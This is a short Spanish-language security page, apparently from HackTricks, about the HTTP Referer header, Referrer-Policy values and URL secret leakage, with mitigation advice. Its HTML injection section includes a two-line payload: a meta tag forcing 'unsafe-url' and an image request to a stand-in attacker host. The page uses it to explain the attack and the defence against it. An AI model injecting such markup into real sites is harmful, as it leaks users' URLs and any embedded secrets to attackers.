# Comportamiento HTTP Interesante

{{#include ../banners/hacktricks-training.md}}

## Cabecera `Referer` y Referrer Policy

La cabecera de solicitud HTTP `Referer` identifica la URL absoluta o parcial desde la que se solicitó un recurso. Dependiendo de la referrer policy activa, puede incluir el origen, la ruta y la cadena de consulta de referencia, pero no el fragmento de URL.<sup>[[1]](#references)</sup>

### Leak de Información Sensible

Los secretos en las rutas de URL o en los parámetros de consulta pueden filtrarse a través del historial del navegador, logs, analytics, enlaces copiados y la cabecera `Referer`. Por lo tanto, un enlace cross-origin o una solicitud de subrecurso puede revelar la URL de referencia a un servidor externo.<sup>[[2]](#references)</sup>

### Mitigación

Usa la cabecera de respuesta `Referrer-Policy` para controlar cuánta información de referencia envía el navegador. `strict-origin-when-cross-origin` es el valor predeterminado moderno en los navegadores, mientras que `no-referrer` suprime la cabecera por completo; elige la policy que coincida con los requisitos de la aplicación.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
No coloques contraseñas, identificadores de sesión, API keys u otros valores sensibles en las URLs. Envíalos en los headers o cuerpos de las solicitudes apropiados mediante TLS.<sup>[[2]](#references)</sup>

### Consideración sobre HTML Injection

Un documento también puede establecer una política para toda la página con `<meta name="referrer">`. Si una vulnerabilidad de HTML injection permite que un atacante inserte un elemento meta efectivo, podría intentar debilitar la política del documento para las solicitudes posteriores. Las políticas meta inyectadas dinámicamente o en conflicto pueden comportarse de forma impredecible, por lo que debes verificar el comportamiento en el navegador objetivo en lugar de asumir que el response header siempre se sobrescribe.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Corrige la inyección de HTML subyacente y mantén los datos confidenciales fuera de la URL; una política de referrer es una medida de defensa en profundidad, no un sustituto de ninguno de esos controles.

## References

- [1] [MDN - encabezado `Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Uso del método de solicitud GET con cadenas de consulta confidenciales](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - encabezado `Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
